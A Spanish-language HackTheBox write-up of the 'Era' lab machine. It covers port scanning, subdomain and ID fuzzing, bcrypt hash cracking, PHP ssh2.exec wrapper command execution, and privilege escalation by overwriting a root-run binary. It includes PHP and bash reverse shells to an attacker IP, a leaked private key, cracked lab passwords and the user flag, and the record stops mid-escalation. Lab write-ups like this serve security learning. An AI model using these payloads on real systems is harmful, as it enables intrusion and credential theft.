---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Era HackTheBox (Intermediate)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-25 05:46 EDT
Nmap scan report for 10.10.11.79
Host is up (0.033s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds
```

Veremos varios puertos interesantes, entre ellos el `80` y el `FTP` (`21`), vemos que en el `80` nos redirige a un dominio llamado `era.htb`, por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>          era.htb
```

Lo guardamos y entramos dentro de dicho dominio a ver que vemos.

```
URL = http://era.htb/
```

Veremos que es una pagina de empresa normal, un poco mas abajo veremos varios empleados de la empresa, por lo que tenemos `3` nombres de usuarios, que podriamos guardarnos por si acaso.

Ya que tenemos un `dominio` vamos a realizar un poco de `fuzzing` para ver si hubiera algun `subdominio`.

## FFUF

Antes nos descargamos un diccionario de `subdominios` de la siguiente pagina:

```shell
wget https://gist.githubusercontent.com/six2dez/a307a04a222fab5a57466c51e1569acf/raw
mv raw subdomains.txt
```

Ahora que tenemos el diccionario vamos hacer lo siguiente:

```shell
ffuf -c -w subdomains.txt -u http://era.htb -H "Host: FUZZ.era.htb" -fs 154
```

Info:

```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb
 :: Wordlist         : FUZZ: /home/kali/Desktop/era/subdomains.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 32ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Veremos que ha funcionado, por lo que vamos añadirlo a nuestro archivo `hosts` el `subdominio` llamado `file`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>           era.htb file.era.htb
```

Lo guardamos y entramos a dicho `subdominio` de esta forma:

```
URL = http://file.era.htb/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 120458.png" alt=""><figcaption></figcaption></figure>

Si le damos a cualquiera de las opciones nos llevara a un `login`, pero no tenemos ningunas credenciales, vamos a realizar un poco de `fuzzing` para ver que otras rutas puede haber.

## Gobuster

```shell
gobuster dir -u http://file.era.htb/ -w <WORDLIST> -x html,php,txt -t 100 -k -r --exclude-length 6765
```

Info:

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://file.era.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          6765
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 403) [Size: 162]
/# license, visit http://creativecommons.org/licenses/by-sa/3.0/.html (Status: 403) [Size: 162]
/login.php            (Status: 200) [Size: 9214]
/download.php         (Status: 200) [Size: 9214]
/register.php         (Status: 200) [Size: 3205]
/files                (Status: 403) [Size: 162]
/assets               (Status: 403) [Size: 162]
/upload.php           (Status: 200) [Size: 9214]
/layout.php           (Status: 200) [Size: 0]
/logout.php           (Status: 200) [Size: 70]
/manage.php           (Status: 200) [Size: 9214]
/LICENSE              (Status: 200) [Size: 34524]
/reset.php            (Status: 200) [Size: 9214]
Progress: 124299 / 882236 (14.09%)^C
```

Con esto veremos una ruta muy interesante llamada `/register.php`, si entramos en dicho archivo.

```
URL = http://file.era.htb/register.php
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 122337.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, vamos a probar a registrar un usuario en la web, una vez registrado nos redirige al `login`, cuando iniciemos sesion con dichas credenciales, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 122458.png" alt=""><figcaption></figcaption></figure>

Si probamos a subir un archivo por ejemplo una `reverse shell`.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Nos vamos a la seccion de `Upload Files` y si nos dejara subirlo:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-25 122653.png" alt=""><figcaption></figcaption></figure>

Pero si nos vamos a dicho `ID` de archivo, solamente nos dejara descargarlo, no nos permite acceder a dicho archivo, por lo que no podremos hacer mucho.

Pero si realizamos un poco de `fuzzing` en el parametro `ID` para ver que otros archivos pueden estar cargados en la pagina, nos vamos a montar un script que haga esto mismo:

> fuzzID.sh

```bash
#!/bin/bash

URL="http://file.era.htb/download.php"
COOKIE="PHPSESSID=<COOKIE>"

echo "[+] Probando IDs del 1 al 1000..."
echo "[+] Buscando archivos existentes..."
echo "[+] Guardando resultados en: results.txt"

> results.txt
valid_ids=0

for id in {1..1000}; do
    # Descargar contenido y verificar si es válido
    content=$(curl -s -H "Cookie: $COOKIE" "$URL?id=$id")
    
    # Verificar si contiene el mensaje de archivo válido
    if echo "$content" | grep -q "Your Download Is Ready!"; then
        # Extraer nombre del archivo
        filename=$(echo "$content" | grep -o '<p>[^<]*</p>' | sed -n '2p' | sed 's/<[^>]*>//g')
        size=$(echo "$content" | wc -c)
        
        echo "[+] ID VÁLIDO: $id - Archivo: $filename - Tamaño: $size bytes"
        echo "ID: $id - Archivo: $filename - URL: $URL?id=$id" >> results.txt
        ((valid_ids++))
        
        # Guardar el contenido HTML para análisis
        echo "$content" > "content_$id.html"
    fi
    
    # Progress cada 50 IDs
    if [ $((id % 50)) -eq 0 ]; then
        echo "Procesados: $id/1000 - Válidos: $valid_ids"
    fi
done

echo "[+] Escaneo completado."
echo "[+] Total de archivos encontrados: $valid_ids"

if [ $valid_ids -gt 0 ]; then
    echo ""
    echo "[+] Resumen:"
    cat results.txt
else
    echo "[-] No se encontraron archivos válidos"
    rm -f results.txt
fi
```

Poniendo nuestra `Cookie` de sesion en el script, lo ejecutaremos de esta forma:

```shell
bash fuzzID.sh
```

Info:

```
[+] Probando IDs del 1 al 1000...
[+] Buscando archivos existentes...
[+] Guardando resultados en: results.txt
Procesados: 50/1000 - Válidos: 0
[+] ID VÁLIDO: 54 - Archivo:  - Tamaño: 6379 bytes
Procesados: 100/1000 - Válidos: 1
[+] ID VÁLIDO: 150 - Archivo:  - Tamaño: 6367 bytes
Procesados: 150/1000 - Válidos: 2
Procesados: 200/1000 - Válidos: 2
Procesados: 250/1000 - Válidos: 2
Procesados: 300/1000 - Válidos: 2
Procesados: 350/1000 - Válidos: 2
Procesados: 400/1000 - Válidos: 2
Procesados: 450/1000 - Válidos: 2
Procesados: 500/1000 - Válidos: 2
Procesados: 550/1000 - Válidos: 2
Procesados: 600/1000 - Válidos: 2
Procesados: 650/1000 - Válidos: 2
Procesados: 700/1000 - Válidos: 2
Procesados: 750/1000 - Válidos: 2
Procesados: 800/1000 - Válidos: 2
Procesados: 850/1000 - Válidos: 2
Procesados: 900/1000 - Válidos: 2
Procesados: 950/1000 - Válidos: 2
Procesados: 1000/1000 - Válidos: 2
[+] Escaneo completado.
[+] Total de archivos encontrados: 2

[+] Resumen:
ID: 54 - Archivo:  - URL: http://file.era.htb/download.php?id=54
ID: 150 - Archivo:  - URL: http://file.era.htb/download.php?id=150
```

Veremos que ha encontrado `2` `IDs`, si entramos en ellos uno sera de un archivo llamado `site-backup-30-08-24.zip` y el otro llamado `signing.zip`, vamos a descargarnos los dos archivos e investigar que pueden contener.

Si descomprimimos el primer archivo:

```shell
unzip signing.zip
```

Info:

```
Archive:  signing.zip
  inflating: key.pem                 
  inflating: x509.genkey
```

Los `2` archivos que se descomprimieron contiene la siguiente informacion:

> key.pem

```
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCqKH30+RZjkxiV
JMnuB6b1dDbWUaw3p2QyQvWMbFvsi7zG1kE2LBrKjsEyvcxo8m0wL9feuFiOlciD
MamELMAW0UjMyew01+S+bAEcOawH81bVahxNkA4hHi9d/rysTe/dnNkh08KgHhzF
mTApjbV0MQwUDOLXSw9eHd+1VJClwhwAsL4xdk4pQS6dAuJEnx3IzNoQ23f+dPqT
CMAAWST67VPZjSjwW1/HHNi12ePewEJRGB+2K+YeGj+lxShW/I1jYEHnsOrliM2h
ZvOLqS9LjhqfI9+Q1RxIQF69yAEUeN4lYupa0Ghr2h96YLRE5YyXaBxdSA4gLGOV
HZgMl2i/AgMBAAECggEALCO53NjamnT3bQTwjtsUT9rYOMtR8dPt1W3yNX2McPWk
wC2nF+7j+kSC0G9UvaqZcWUPyfonGsG3FHVHBH75S1H54QnGSMTyVQU+WnyJaDyS
+2R9uA8U4zlpzye7+LR08xdzaed9Nrzo+Mcuq7DTb7Mjb3YSSAf0EhWMyQSJSz38
nKOcQBQhwdmiZMnVQp7X4XE73+2Wft9NSeedzCpYRZHrI820O+4MeQrumfVijbL2
xx3o0pnvEnXiqbxJjYQS8gjSUAFCc5A0fHMGmVpvL+u7Sv40mj/rnGvDEAnaNf+j
SlC9KdF5z9gWAPii7JQtTzWzxDinUxNUhlJ00df29QKBgQDsAkzNjHAHNKVexJ4q
4CREawOfdB/Pe0lm3dNf5UlEbgNWVKExgN/dEhTLVYgpVXJiZJhKPGMhSnhZ/0oW
gSAvYcpPsuvZ/WN7lseTsH6jbRyVgd8mCF4JiCw3gusoBfCtp9spy8Vjs0mcWHRW
PRY8QbMG/SUCnUS0KuT1ikiIYwKBgQC4kkKlyVy2+Z3/zMPTCla/IV6/EiLidSdn
RHfDx8l67Dc03thgAaKFUYMVpwia3/UXQS9TPj9Ay+DDkkXsnx8m1pMxV0wtkrec
pVrSB9QvmdLYuuonmG8nlgHs4bfl/JO/+Y7lz/Um1qM7aoZyPFEeZTeh6qM2s+7K
kBnSvng29QKBgQCszhpSPswgWonjU+/D0Q59EiY68JoCH3FlYnLMumPlOPA0nA7S
4lwH0J9tKpliOnBgXuurH4At9gsdSnGC/NUGHII3zPgoSwI2kfZby1VOcCwHxGoR
vPqt3AkUNEXerkrFvCwa9Fr5X2M8mP/FzUCkqi5dpakduu19RhMTPkdRpQKBgQCJ
tU6WpUtQlaNF1IASuHcKeZpYUu7GKYSxrsrwvuJbnVx/TPkBgJbCg5ObFxn7e7dA
l3j40cudy7+yCzOynPJAJv6BZNHIetwVuuWtKPwuW8WNwL+ttTTRw0FCfRKZPL78
D/WHD4aoaKI3VX5kQw5+8CP24brOuKckaSlrLINC9QKBgDs90fIyrlg6YGB4r6Ey
4vXtVImpvnjfcNvAmgDwuY/zzLZv8Y5DJWTe8uxpiPcopa1oC6V7BzvIls+CC7VC
hc7aWcAJeTlk3hBHj7tpcfwNwk1zgcr1vuytFw64x2nq5odIS+80ThZTcGedTuj1
qKTzxN/SefLdu9+8MXlVZBWj
-----END PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDajCCAlKgAwIBAgIUbWNKqYHhk6HkSMUgX/ebhOa29QswDQYJKoZIhvcNAQEL
BQAwTzERMA8GA1UECgwIRXJhIEluYy4xGTAXBgNVBAMMEEVMRiB2ZXJpZmljYXRp
b24xHzAdBgkqhkiG9w0BCQEWEHl1cml2aWNoQGVyYS5jb20wIBcNMjUwMTI2MDIw
OTM1WhgPMjEyNTAxMDIwMjA5MzVaME8xETAPBgNVBAoMCEVyYSBJbmMuMRkwFwYD
VQQDDBBFTEYgdmVyaWZpY2F0aW9uMR8wHQYJKoZIhvcNAQkBFhB5dXJpdmljaEBl
cmEuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqih99PkWY5MY
lSTJ7gem9XQ21lGsN6dkMkL1jGxb7Iu8xtZBNiwayo7BMr3MaPJtMC/X3rhYjpXI
gzGphCzAFtFIzMnsNNfkvmwBHDmsB/NW1WocTZAOIR4vXf68rE3v3ZzZIdPCoB4c
xZkwKY21dDEMFAzi10sPXh3ftVSQpcIcALC+MXZOKUEunQLiRJ8dyMzaENt3/nT6
kwjAAFkk+u1T2Y0o8FtfxxzYtdnj3sBCURgftivmHho/pcUoVvyNY2BB57Dq5YjN
oWbzi6kvS44anyPfkNUcSEBevcgBFHjeJWLqWtBoa9ofemC0ROWMl2gcXUgOICxj
lR2YDJdovwIDAQABozwwOjAMBgNVHRMBAf8EAjAAMAsGA1UdDwQEAwIHgDAdBgNV
HQ4EFgQU/XYF/LzWBMr+NhZw/PHUlQHb0s0wDQYJKoZIhvcNAQELBQADggEBAAzE
eNQxIJH6Z8vOvP8g1OoyD0Ot9E8U/PdxlM7QWqk9qcH0xyQZqg7Ee5L/kq4y/1i1
ZxAPlBfOUx4KhZgWVkStfvut0Ilg3VSXVntPPRi8WAcDV5nivYtphv16ZQkaclFy
dN0mYQc2NlqDv+y5FKnGbkioRUVGGmkIqeaT4HIUA2CFRnTr2Jao0TwAIG0jfpov
+y/t2WhUNto9L04vcD3ZAzuEPZnqs/L9rsoDZ1Ee3DxnOC7l3PkklaIiDrXiHAkd
Nrg7N9XCeQr0FUS0xLMBMVCEJT2TCo6lXKtcI5A5FgAcyECDzkw+HdgSYFPaoYJq
5rxH+xhuDqRDr941Sg4=
-----END CERTIFICATE-----
```

> x509.genkey

```
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
prompt = no
string_mask = utf8only
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid
```

Ya mirando esto veremos informacion muy interesante entre ella un nombre de usuario llamado `yurivich` el cual nos vamos a guardar, si descomprimimos el segundo archivo.

```shell
unzip site-backup-30-08-24.zip
```

Info:

```
Archive:  site-backup-30-08-24.zip
  inflating: LICENSE                 
  inflating: bg.jpg                  
   creating: css/
  inflating: css/main.css.save       
  inflating: css/main.css            
  inflating: css/fontawesome-all.min.css  
  inflating: css/noscript.css        
   creating: css/images/
 extracting: css/images/overlay.png  
  inflating: download.php            
  inflating: filedb.sqlite           
   creating: files/
  inflating: files/.htaccess         
 extracting: files/index.php         
  inflating: functions.global.php    
  inflating: index.php               
  inflating: initial_layout.php      
  inflating: layout.php              
  inflating: layout_login.php        
  inflating: login.php               
  inflating: logout.php              
  inflating: main.png                
  inflating: manage.php              
  inflating: register.php            
  inflating: reset.php               
   creating: sass/
   creating: sass/layout/
  inflating: sass/layout/_wrapper.scss  
  inflating: sass/layout/_footer.scss  
  inflating: sass/layout/_main.scss  
  inflating: sass/main.scss          
   creating: sass/base/
  inflating: sass/base/_page.scss    
  inflating: sass/base/_reset.scss   
  inflating: sass/base/_typography.scss  
   creating: sass/libs/
  inflating: sass/libs/_vars.scss    
  inflating: sass/libs/_vendor.scss  
  inflating: sass/libs/_functions.scss  
  inflating: sass/libs/_mixins.scss  
  inflating: sass/libs/_breakpoints.scss  
  inflating: sass/noscript.scss      
   creating: sass/components/
  inflating: sass/components/_actions.scss  
  inflating: sass/components/_icons.scss  
  inflating: sass/components/_button.scss  
  inflating: sass/components/_icon.scss  
  inflating: sass/components/_list.scss  
  inflating: sass/components/_form.scss  
  inflating: screen-download.png     
  inflating: screen-login.png        
  inflating: screen-main.png         
  inflating: screen-manage.png       
  inflating: screen-upload.png       
  inflating: security_login.php      
  inflating: upload.php              
   creating: webfonts/
  inflating: webfonts/fa-solid-900.eot  
  inflating: webfonts/fa-regular-400.ttf  
  inflating: webfonts/fa-regular-400.woff  
  inflating: webfonts/fa-solid-900.svg  
  inflating: webfonts/fa-solid-900.ttf  
  inflating: webfonts/fa-solid-900.woff  
  inflating: webfonts/fa-brands-400.ttf  
 extracting: webfonts/fa-regular-400.woff2  
  inflating: webfonts/fa-solid-900.woff2  
  inflating: webfonts/fa-regular-400.eot  
  inflating: webfonts/fa-regular-400.svg  
  inflating: webfonts/fa-brands-400.woff2  
  inflating: webfonts/fa-brands-400.woff  
  inflating: webfonts/fa-brands-400.eot  
  inflating: webfonts/fa-brands-400.svg
```

Veremos efectivamente los archivos de la pagina web en formato de `backup`, vamos analizar a ver si hubiera algo interesante.

Investigando un poco veremos un archivo llamado `filedb.sqlite` el cual vamos a observar por la herramienta de `sqlite3`.

```shell
sqlite3 filedb.sqlite
```

Entrando dentro de la interfaz, vamos a listar las tablas.

```mysql
.tables
```

Info:

```
files  users
```

Si vemos que contiene la tabla `users`.

```mysql
select * from users;
```

Info:

```
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```

Veremos varias credenciales, por lo que vamos a probar a intentar crackearlas de esta forma:

## John (Crackeo)

> hash

```
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

Teniendo nuestro archivo de credenciales `hasheadas` vamos a `crackearlo` de esta forma:

```shell
john --format=bcrypt --wordlist=<WORDLIST> hash
```

Info:

```
Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
america          (eric)     
mustang          (yuri)
2g 0:00:01:47 0.06% (ETA: 2025-09-27 07:32) 0.01854g/s 98.15p/s 397.9c/s 397.9C/s kasandra..jhoan
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Veremos que pudimos obtener `2` credenciales, vamos a probarlas por `FTP` a ver si funcionan tambien.

```shell
ftp yuri@<IP>
```

Metemos como contraseña `mustang`...

```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||44677|)
150 Here comes the directory listing.
drwxr-xr-x    4 0        114          4096 Jul 22 08:42 .
drwxr-xr-x    4 0        114          4096 Jul 22 08:42 ..
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
```

Veremos que ha funcionado con el usuario `yuri`, si listamos veremos `2` directorios de configuracion, pero no veremos nada interesante, si nosotros vemos como esta compuesto el archivo de `download.php` que vimos antes.

> download.php

```php
<?php

require_once('functions.global.php');
require_once('layout.php');

function deliverMiddle_download($title, $subtitle, $content) {
    return '
    <main style="
        display: flex; 
        flex-direction: column; 
        align-items: center; 
        justify-content: center; 
        height: 80vh; 
        text-align: center;
        padding: 2rem;
    ">
        <h1>' . htmlspecialchars($title) . '</h1>
        <p>' . htmlspecialchars($subtitle) . '</p>
        <div>' . $content . '</div>
    </main>
    ';
}


if (!isset($_GET['id'])) {
        header('location: index.php'); // user loaded without requesting file by id
        die();
}

if (!is_numeric($_GET['id'])) {
        header('location: index.php'); // user requested non-numeric (invalid) file id
        die();
}

$reqFile = $_GET['id'];

$fetched = contactDB("SELECT * FROM files WHERE fileid='$reqFile';", 1);

$realFile = (count($fetched) != 0); // Set realFile to true if we found the file id, false if we didn't find it

if (!$realFile) {
        echo deliverTop("Era - Download");

        echo deliverMiddle("File Not Found", "The file you requested doesn't exist on this server", "");

        echo deliverBottom();
} else {
        $fileName = str_replace("files/", "", $fetched[0]);


        // Allow immediate file download
        if ($_GET['dl'] === "true") {

                header('Content-Type: application/octet-stream');
                header("Content-Transfer-Encoding: Binary");
                header("Content-disposition: attachment; filename=\"" .$fileName. "\"");
                readfile($fetched[0]);
        // BETA (Currently only available to the admin) - Showcase file instead of downloading it
        } elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
                $format = isset($_GET['format']) ? $_GET['format'] : '';
                $file = $fetched[0];

                if (strpos($format, '://') !== false) {
                        $wrapper = $format;
                        header('Content-Type: application/octet-stream');
                } else {
                        $wrapper = '';
                        header('Content-Type: text/html');
                }

                try {
                        $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
                        $full_path = $wrapper ? $wrapper . $file : $file;
                        // Debug Output
                        echo "Opening: " . $full_path . "\n";
                        echo $file_content;
                } catch (Exception $e) {
                        echo "Error reading file: " . $e->getMessage();
                }


        // Allow simple download
        } else {
                echo deliverTop("Era - Download");
                echo deliverMiddle_download("Your Download Is Ready!", $fileName, '<a href="download.php?id='.$_GET['id'].'&dl=true"><i class="fa fa-download fa-5x"></i></a>');

        }

}


?>
```

Vamos a ver que tiene una vulnerabilidad de `Acceso a wrappers de PHP - LECTOR DE ARCHIVOS` pero para ello tendremos que ser `admin`, si recordamos antes, tenemos el usuario de `administrador` su nombre, vamos a cerrar sesion y vamos a irnos al archivo llamado `reset.php` para poder resetear a dicho usuario, en todos los campos meteremos el nombre de `admin_ef01cab31aa` estando en la misma sesion de nuestro usuario ya logueados y cuando le demos a `resetear` veremos que nos redirige a la sesion actual, cerramos sesion y vamos otra vez a `reset.php` volvemos a meter `admin_ef01cab31aa` en todos los campos y ya seremos los administradores, por lo que nos inicia sesion de forma automatica, una vez siendo administradores, podremos probar la vulnerabilidad de esta forma:

Vemos que se pueden utilizar `wrappers` como `ssh2.shell:// o ssh2.exec://`, utilizaremos en este caso el de `exec` para ejecutar un comando, nos pondremos a la escucha en un servidor de `python3` para ver si se ejecuta de forma correcta dicho comando:

```shell
python3 -m http.server 80
```

Ahora si ejecutamos esto:

```
URL = http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/curl http://<IP_ATTACKER>/
```

Se nos descargara un archivo, pero ese no nos interesa, si vamos a nuestro servidor de `python3` veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.79 - - [25/Sep/2025 07:58:59] code 404, message File not found
10.10.11.79 - - [25/Sep/2025 07:58:59] "GET /files/site-backup-30-08-24.zip HTTP/1.1" 404 -
```

Vemos que se esta ejecutando bien, por lo que vamos a ejecutar una `reverse shell` de esta forma:

```
URL = http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://yuri:mustang@127.0.0.1/bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.98/7777%200%3E%261%22+
```

Le añadiremos un `+` a lo ultimo para que separe el comando que concatena al que nosotros estamos enviando, ya que si lo enviamos sin el `+` se va a concatenar el comando `files/site-backup-30-08-24.zip` y no funcionara.

Antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora si le damos a `ENTER` en la `URL` para que se ejecute y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.98] from (UNKNOWN) [10.10.11.79] 55300
bash: cannot set terminal process group (26239): Inappropriate ioctl for device
bash: no job control in this shell
yuri@era:~$ whoami
whoami
yuri
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user eric

Si nosotros listamos el `passwd` veremos que hay otro usuario llamado `eric` y si recordamos antes tenemos sus credenciales, vamos a probarlo directamente desde esta shell a ver si nos dejara.

```shell
su eric
```

Metemos como contraseña `america`...

```
eric@era:/home/yuri$ whoami
eric
```

Veremos que estaremos dentro con dicho usuario, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
df5cefc62780d3247b132cb10e811879
```

## Escalate Privileges

Si listamos del grupo que somos veremos esto:

```
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

Vemos que somos del grupo `devs`, vamos a realizar un `find` para ver que podemos hacer con dicho grupo en el sistema.

```shell
find / -group devs -type f 2>/dev/null
```

Info:

```
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

Veremos que esta en la carpeta `/opt` la carpeta `AV` en la cual pertenece a dicho `grupo`, si entramos dentro donde la carpeta `periodic-checks` veremos los siguientes permisos:

```
total 32
drwxrwxr-- 2 root devs  4096 Sep 25 12:14 .
drwxrwxr-- 3 root devs  4096 Jul 22 08:42 ..
-rwxrw---- 1 root devs 16544 Sep 25 12:14 monitor
-rw-rw---- 1 root devs   307 Sep 25 12:14 status.log
```

Vemos que podemos editar y sobreescribir el archivo `monitor`, vamos a probar a estar a la escucha de cualquier proceso con una herramienta llamada`pspy64`.

URL = [Download pspy64 linux](https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64)

```shell
cd /tmp
wget http://<IP_ATTACKER>/pspy64 # Desde nuestra maquina atacante nos descargamos el archivo abrimos un servidor de python3 y nos lo pasamos asi.
./pspy64
```

Info:

```
............................<RESTO DE CODIGO>......................................
2025/09/25 12:19:04 CMD: UID=0     PID=1      | /sbin/init 
2025/09/25 12:20:01 CMD: UID=0     PID=26634  | /usr/sbin/CRON -f -P 
2025/09/25 12:20:01 CMD: UID=0     PID=26633  | /usr/sbin/CRON -f -P 
2025/09/25 12:20:01 CMD: UID=0     PID=26635  | /bin/sh -c /root/clean_monitor.sh 
2025/09/25 12:20:01 CMD: UID=0     PID=26636  | /bin/bash /root/clean_monitor.sh 
2025/09/25 12:20:01 CMD: UID=0     PID=26637  | cp /root/monitor /opt/AV/periodic-checks/monitor 
2025/09/25 12:20:01 CMD: UID=0     PID=26638  | 
2025/09/25 12:20:01 CMD: UID=0     PID=26639  | chown root:devs /opt/AV/periodic-checks/monitor 
2025/09/25 12:20:01 CMD: UID=0     PID=26640  | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/09/25 12:20:01 CMD: UID=0     PID=26641  | bash -c /root/initiate_monitoring.sh 
2025/09/25 12:20:01 CMD: UID=0     PID=26642  | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/09/25 12:20:01 CMD: UID=0     PID=26645  | openssl asn1parse -inform DER -in text_sig_section.bin 
2025/09/25 12:20:01 CMD: UID=0     PID=26644  | /bin/bash /root/initiate_monitoring.sh 
2025/09/25 12:20:01 CMD: UID=0     PID=26648  | 
2025/09/25 12:20:01 CMD: UID=0     PID=26646  | /bin/bash /root/initiate_monitoring.sh 
2025/09/25 12:20:01 CMD: UID=0     PID=26651  | /bin/bash /root/initiate_monitoring.sh 
2025/09/25 12:20:01 CMD: UID=0     PID=26649  | /bin/bash /root/initiate_monitoring.sh 
2025/09/25 12:20:01 CMD: UID=0     PID=26652  | /opt/AV/periodic-checks/monitor 
2025/09/25 12:20:04 CMD: UID=0     PID=26655  | 
^CExiting program... (interrupt)
```

Vemos que cada `x` tiempo se esta ejecutando el binario `monitor` como el usuario `root`, por lo que podremos hacer lo siguiente:

> monitor

```bash
#!/bin/bash 

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Si hacemos esto y esperamos un rato monitoreando los procesos veremos esto otro:

```
2025/09/25 12:23:21 CMD: UID=0     PID=1      | /sbin/init 
2025/09/25 12:24:01 CMD: UID=0     PID=26727  | bash -c /root/initiate_monitoring.sh 
